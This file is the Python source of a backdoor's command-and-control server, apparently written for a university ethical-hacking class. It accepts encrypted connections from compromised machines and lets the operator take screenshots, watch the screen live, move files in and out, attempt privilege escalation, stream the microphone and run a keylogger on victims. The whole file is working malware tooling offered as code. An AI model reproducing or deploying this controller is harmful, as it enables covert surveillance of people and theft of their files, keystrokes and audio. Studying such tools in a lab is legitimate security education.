#!/usr/bin/env python3
#################################################################################################
# Authors: Korn D., Krittanut Y., Sirapat T., Sarun P., Norraset S., Thanapat S., Siwanon T.    #
# Class: SIIT Ethical Hacking, 2023-2024                                                      #
#################################################################################################

import base64
import datetime
import socket
import json
import os
import ctypes
from ctypes import c_char_p, c_int, CFUNCTYPE
import pyaudio
import threading
import time
from cryptography.fernet import Fernet
import cv2
import numpy as np

# ANSI color codes for improved UX
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Pre-shared key for encryption
psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI='
cipher = Fernet(psk_aes)

# Global variables for multi-client support
clients = {}
client_counter = 0
selected_client = None


def reliable_send(data, target_socket):
    try:
        jsondata = json.dumps(data)
        encrypted = cipher.encrypt(jsondata.encode())
        length = len(encrypted)
        target_socket.sendall(length.to_bytes(4, 'big'))
        target_socket.sendall(encrypted)
        return True
    except Exception:
        return False


def reliable_recv(target_socket):
    try:
        length_bytes = target_socket.recv(4)
        if not length_bytes:
            return None
        length = int.from_bytes(length_bytes, 'big')
        payload = b''
        while len(payload) < length:
            chunk = target_socket.recv(length - len(payload))
            if not chunk:
                return None
            payload += chunk
        decrypted = cipher.decrypt(payload)
        return json.loads(decrypted.decode())
    except Exception:
        return None


def list_clients():
    if not clients:
        print(f"{RED}[-] No active connections{RESET}")
        return
    print(f"\n{BOLD}{CYAN}╔═══════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║                   ACTIVE CLIENTS                     \t║{RESET}")
    print(f"{CYAN}╠═══════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║ {'ID':<4}│ {'TYPE':<12}│ {'IP ADDRESS':<18}│ {'STATUS':<10} \t║{RESET}")
    print(f"{CYAN}╠═══════════════════════════════════════════════════════╣{RESET}")
    for cid, info in clients.items():
        status = f"{GREEN}Connected{RESET}" if info['connected'] else f"{RED}Disconnected{RESET}"
        print(f"{CYAN}║ {BOLD}{cid:<4}{RESET}{CYAN}│ {info['type']:<12}│ {info['address'][0]:<18}│ {status:<18} {CYAN}\t║{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════╝{RESET}")


def handle_client(client_socket, client_address, client_id):
    shell_type = "Admin" if client_id > 1 else "User"
    print(f"{GREEN}[+] Client {client_id} ({shell_type}) connected from {client_address[0]}{RESET}")
    clients[client_id] = {
        'socket': client_socket,
        'address': client_address,
        'type': shell_type,
        'connected': True
    }
    
    # # Auto-select admin shells when they connect
    # global selected_client
    # if client_id > 1:  # Admin shell
    #     selected_client = client_id
    #     print(f"{GREEN}[+] Auto-selected Admin Client {client_id} for interaction{RESET}")
    # else:
    #     # Show updated client list for user shells only
    #     list_clients()
    
    try:
        while clients[client_id]['connected']:
            time.sleep(1)
    except Exception as e:
        print(f"{RED}[-] Client {client_id} error: {str(e)}{RESET}")
    finally:
        if client_id in clients:
            clients[client_id]['connected'] = False
            try:
                client_socket.close()
            except:
                pass
            del clients[client_id]
            print(f"{YELLOW}[-] Client {client_id} session closed{RESET}")


def select_client():
    global selected_client
    list_clients()
    try:
        cid = int(input(f"{YELLOW}\n[*] Enter Client ID to interact:{RESET} "))
        if cid in clients and clients[cid]['connected']:
            selected_client = cid
            info = clients[cid]
            print(f"{GREEN}[+] Now interacting with Client {cid} ({info['type']}) at {info['address'][0]}{RESET}")
            return True
        else:
            print(f"{RED}[!] Invalid Client ID. Use 'clients' to view active IDs.{RESET}")
            return False
    except ValueError:
        print(f"{RED}[!] Please enter a valid numeric Client ID{RESET}")
        return False


def upload_file(file_name, target_socket):
    try:
        with open(file_name, 'rb') as f:
            target_socket.send(f.read())
        print(f"{GREEN}[+] Uploaded {file_name}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Upload error: {str(e)}{RESET}")


def download_file(file_name, target_socket):
    try:
        with open(file_name, 'wb') as f:
            target_socket.settimeout(1)
            chunk = target_socket.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target_socket.recv(1024)
                except socket.timeout:
                    break
            target_socket.settimeout(None)
        print(f"{GREEN}[+] Downloaded {file_name}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Download error: {str(e)}{RESET}")


# Suppress ALSA errors
ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
def py_error_handler(filename, line, function, err, fmt): pass
c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)
try:
    asound = ctypes.cdll.LoadLibrary('libasound.so')
    asound.snd_lib_error_set_handler(c_error_handler)
except OSError:
    pass

stream_flag = {'on': False}

def start_audio_receiver(target_socket):
    global stream_flag, audio_thread
    if not stream_flag['on']:
        stream_flag = {'on': True}
        audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag, target_socket), daemon=True).start()
        result = reliable_recv()
        print(result)
    else:
        print(f"{YELLOW}[!] Audio stream already running. Use 'listening_stop' to stop it.{RESET}")

def stop_audio_receiver(target_socket):
    global stream_flag, audio_thread
    if stream_flag['on']:
        stream_flag['on'] = False
        if audio_thread:
            audio_thread.join()  # Wait for the audio thread to finish
            audio_thread = None  # Reset the thread reference
        result = reliable_recv(target_socket)
        print(result)
    else:
        pass

def stream_audio_from_target(flag, target_socket):
    CHUNK, FORMAT, CHANNELS, RATE = 1024, pyaudio.paInt16, 1, 11025
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
    try:
        while flag['on']:
            data = target_socket.recv(CHUNK)
            if not data: break
            stream.write(data)
    finally:
        stream.stop_stream(); stream.close(); p.terminate()


# Screen surveillance functions
def recieve_shot(target_socket):
    shot = reliable_recv(target_socket)
    if shot:
        try:
            img = base64.b64decode(shot)
            fname = f"screenshot_c{selected_client}_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
            with open(fname, 'wb') as f:
                f.write(img)
            print(f"{GREEN}[+] Screenshot saved as {fname}{RESET}")
        except Exception as e:
            print(f"{RED}[-] Screenshot processing error: {str(e)}{RESET}")
    else:
        print(f"{RED}[-] No screenshot received{RESET}")

def start_screen_stream():
    threading.Thread(target=receive_screen_stream, daemon=True).start()
    print(f"{YELLOW}[*] Awaiting live stream...{RESET}")

def receive_screen_stream():
    stream_sock = socket.socket()
    stream_sock.bind(('0.0.0.0', 9999))
    stream_sock.listen(1)
    conn, addr = stream_sock.accept()
    try:
        while True:
            size_data = conn.recv(4)
            if not size_data: break
            size = int.from_bytes(size_data, 'big')
            data = b''
            while len(data) < size:
                packet = conn.recv(size - len(data))
                if not packet: break
                data += packet
            img = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)
            if img is not None:
                resized = cv2.resize(img, (1280, 720))
                cv2.imshow("Live Screen", resized)
                if cv2.waitKey(1) == ord('q'):
                    break
    finally:
        conn.close()
        cv2.destroyAllWindows()


def target_communication():
    global selected_client
    HELP_TEXT = f"""
Available Server Commands:
  clients           List all client sessions
  select            Choose a client to interact with
  clear             Clear the console
  help              Show this help message

Within Client Session:
  screenshot        Capture a screenshot from the client
  screen_stream     View live screen stream
  upload <file>     Upload a file to the client
  download <file>   Download a file from the client
  elevate           Attempt privilege escalation on client
  listening_start   Start microphone audio stream
  listening_stop    Stop microphone audio stream
  keylogger_start   Begin keylogging
  keylogger_stop    End keylogging
  keylogger_dump    Retrieve keylogger data
"""
    while True:
        if not clients:
            print(f"{YELLOW}[-] Waiting for clients...{RESET}")
            time.sleep(2)
            continue
        if selected_client is None or selected_client not in clients:
            if not select_client():
                continue
        info = clients[selected_client]
        sock = info['socket']
        prompt = f"{BOLD}{BLUE}[{info['type']} Client-{selected_client}@{info['address'][0]}]{RESET} {YELLOW}➤{RESET} "
        try:
            cmd = input(prompt).strip()
        except EOFError:
            print(f"\n{YELLOW}[!] exiting...{RESET}")
            os._exit(0)
        if cmd == 'quit' or cmd == 'exit':
            print(f"{YELLOW}[!] Exiting server...{RESET}")
            os._exit(0)
        if cmd == 'help':
            print(HELP_TEXT)
            continue
        if cmd == 'clients':
            list_clients()
            continue
        if cmd == 'select':
            selected_client = None
            continue
        if cmd == 'clear':
            os.system('cls' if os.name=='nt' else 'clear')
            continue
        if not reliable_send(cmd, sock):
            print(f"{RED}[-] Failed to send command to client{RESET}")
            selected_client = None
            continue
        # Handle special commands locally
        if cmd.startswith('download '):
            download_file(cmd.split(' ',1)[1], sock)
        elif cmd.startswith('upload '):
            upload_file(cmd.split(' ',1)[1], sock)
        elif cmd == 'listening_start':
            start_audio_receiver(sock)
        elif cmd == 'listening_stop':
            stop_audio_receiver(sock)
        elif cmd == 'screenshot':
            recieve_shot(sock)
        elif cmd == 'screen_stream':
            start_screen_stream()
            result = reliable_recv(sock)
            print(result)            
        else:
            res = reliable_recv(sock)
            if res:
                print(res)


def start_server():
    global client_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bind_ip, bind_port = '192.168.210.1', 5555
    sock.bind((bind_ip, bind_port))
    sock.listen(10)
    print(f"{BOLD}{CYAN}╔═══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║                        ENHANCED BACKDOOR SERVER                   ║{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════════════╝{RESET}")
    print(f"{GREEN}[+] Enhanced Backdoor Server Started on {bind_ip}:{bind_port}{RESET}")
    print(f"{YELLOW}[*] Type 'help' for commands list{RESET}")
    print(f"{CYAN}{'─' * 70}{RESET}")
    threading.Thread(target=target_communication, daemon=True).start()
    try:
        while True:
            client_sock, addr = sock.accept()
            client_counter += 1
            threading.Thread(
                target=handle_client,
                args=(client_sock, addr, client_counter),
                daemon=True
            ).start()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Shutting down server...{RESET}")
    finally:
        sock.close()


if __name__ == '__main__':
    start_server()
